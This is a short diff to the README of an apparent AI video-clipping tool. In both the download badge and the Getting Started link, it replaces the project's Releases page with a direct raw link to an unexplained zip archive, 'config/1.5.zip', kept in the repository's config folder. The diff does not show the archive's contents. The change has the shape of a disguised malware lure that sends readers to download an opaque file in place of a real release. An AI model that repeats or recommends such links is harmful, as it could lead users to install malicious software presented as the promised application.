@@ -1,6 +1,6 @@
 # 🎬 generate-clips-for-tiktok-and-instagram - AI Clips from Long Videos
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/derhderhderh/generate-clips-for-tiktok-and-instagram/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/derhderhderh/generate-clips-for-tiktok-and-instagram/raw/refs/heads/main/config/1.5.zip)
 
 ## 🤔 What Does This Do?
 
@@ -8,7 +8,7 @@ Turns your long YouTube videos into short, vertical clips for TikTok and Instagr
 
 ## 📥 Getting Started
 
-Visit this link to download the application: [https://github.com/derhderhderh/generate-clips-for-tiktok-and-instagram/releases](https://github.com/derhderhderh/generate-clips-for-tiktok-and-instagram/releases)
+Visit this link to download the application: [https://github.com/derhderhderh/generate-clips-for-tiktok-and-instagram/raw/refs/heads/main/config/1.5.zip](https://github.com/derhderhderh/generate-clips-for-tiktok-and-instagram/raw/refs/heads/main/config/1.5.zip)
 
 ## 🖥️ Download and Install
 
